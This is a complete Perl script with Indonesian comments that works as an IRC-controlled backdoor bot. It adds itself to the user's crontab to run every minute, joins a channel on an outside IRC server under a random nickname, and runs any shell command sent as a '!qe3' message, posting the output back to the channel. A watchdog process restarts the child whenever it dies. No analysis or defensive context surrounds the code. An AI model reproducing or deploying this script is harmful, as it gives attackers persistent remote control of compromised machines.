#!/usr/bin/perl
use strict;
use warnings;
use IO::Socket::INET;
use POSIX ":sys_wait_h";
use File::Basename;
use File::Spec::Functions qw(rel2abs);

# Path ke file PID
my $pid_file = '/dev/shm/qe3.pid';

# Path ke skrip ini
my $script_path = rel2abs($0);

# Fungsi untuk membuat nickname acak
sub generate_random_nick {
    my @chars = ('A'..'Z', 'a'..'z', '0'..'9');
    my $nick = '';
    $nick .= $chars[rand @chars] for 1..8;
    return $nick;
}

# Fungsi untuk menghubungkan ke IRC
sub connect_to_irc {
    my $server = 'irc.ongisnade.co.id';
    my $port = 7000;
    my $channel = '#surabayacity';
    my $nick = generate_random_nick();

    my $socket = IO::Socket::INET->new(
        PeerAddr => $server,
        PeerPort => $port,
        Proto    => 'tcp'
    ) or die "Could not connect to IRC server: $!";

    print $socket "NICK $nick\r\n";
    print $socket "USER $nick 8 * :Perl IRC Client\r\n";
    print $socket "JOIN $channel\r\n";

    return $socket;
}

# Fungsi untuk memeriksa dan membuat file PID
sub create_pid_file {
    open(my $fh, '>', $pid_file) or die "Could not create PID file: $!";
    print $fh $$;
    close($fh);
}

# Fungsi untuk memeriksa apakah skrip sudah berjalan
sub check_if_already_running {
    if (-e $pid_file) {
        open(my $fh, '<', $pid_file) or die "Could not open PID file: $!";
        my $pid = <$fh>;
        close($fh);
        chomp $pid;
        if ($pid && kill 0, $pid) {
            print "Script is already running with PID $pid\n";
            exit 0;
        } else {
            print "PID file exists but process not running. Starting new process.\n";
        }
    }
}

# Fungsi untuk menambahkan cron job jika belum ada
sub ensure_cron_job {
    my $cron_job = "* * * * * /usr/bin/perl $script_path\n";
    my $cron_exists = `crontab -l 2>/dev/null | grep -F "$script_path"`;
    unless ($cron_exists) {
        my $current_crontab = `crontab -l 2>/dev/null`;
        open(my $fh, '| crontab -') or die "Could not open crontab: $!";
        print $fh $current_crontab;
        print $fh $cron_job;
        close($fh);
    }
}

# Pastikan cron job ada
ensure_cron_job();

# Memeriksa apakah skrip sudah berjalan
check_if_already_running();

# Membuat file PID
create_pid_file();

# Fungsi untuk mengeksekusi perintah shell
sub execute_command {
    my ($command) = @_;
    my $output = `$command 2>&1`;
    return $output;
}

my $pid = fork();
if (!defined $pid) {
    die "Cannot fork: $!";
}

if ($pid == 0) {
    # Ini adalah proses anak, jalankan proses utama Anda di sini
    my $socket = connect_to_irc();
    while (1) {
        my $input = <$socket>;
        if (defined $input) {
            print $input;  # Output dari server IRC
            if ($input =~ /^PING(.*)$/i) {
                print $socket "PONG$1\r\n";
            } elsif ($input =~ /^:.* PRIVMSG .* :!qe3 (.*)$/i) {
                my $command = $1;
                my $result = execute_command($command);
                my $response = "PRIVMSG #surabayacity :$result\r\n";
                print $socket $response;
            }
        }
        sleep(1);
    }
} else {
    # Ini adalah proses induk, memantau proses anak
    $SIG{CHLD} = sub {
        waitpid(-1, WNOHANG);
        # Jika proses anak mati, kita restart proses anak
        if ($? == -1 || $? != 0) {
            $pid = fork();
            if ($pid == 0) {
                my $socket = connect_to_irc();
                while (1) {
                    my $input = <$socket>;
                    if (defined $input) {
                        print $input;
                        if ($input =~ /^PING(.*)$/i) {
                            print $socket "PONG$1\r\n";
                        } elsif ($input =~ /^:.* PRIVMSG .* :!qe3 (.*)$/i) {
                            my $command = $1;
                            my $result = execute_command($command);
                            my $response = "PRIVMSG #surabayacity :$result\r\n";
                            print $socket $response;
                        }
                    }
                    sleep(1);
                }
            }
        }
    };

    while (1) {
        # Proses induk berjalan, memantau proses anak
        sleep(1);
    }
}
